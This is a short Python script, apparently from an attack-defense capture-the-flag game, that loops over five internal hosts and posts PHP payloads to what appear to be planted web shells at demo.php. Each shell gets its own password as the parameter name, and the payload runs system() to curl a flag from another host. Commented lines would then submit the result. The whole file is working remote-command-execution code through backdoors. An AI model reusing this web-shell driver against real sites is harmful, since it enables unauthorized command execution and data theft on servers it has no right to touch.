#_*_coding:utf-8_*_
import requests
flag_post_url='http://10.10.1.152'
#每隔5分钟自动提交flag
#joomla
list_url=['http://10.10.1.165/demo.php',
          'http://10.10.1.154/demo.php','http://10.10.1.168/demo.php',
          'http://10.10.1.172/demo.php','http://10.10.1.151/demo.php']
list_pass=['vf0k28','iamctfing','vf1dm0','vf87on','vfaioq']
for i in range(5):
    payload={list_pass[i]:"echo system('curl http://10.10.1.152:8000/flag');" }
    r=requests.post(list_url[i],data=payload)
    #如果结果不为空
    print r.content
    #flag=r.content
    #payload={'flag':flag}
    #cookie={'session':'xx'}
    #r=requests.post(flag_post_url,data=payload,cookies=cookie)    
#pwn1
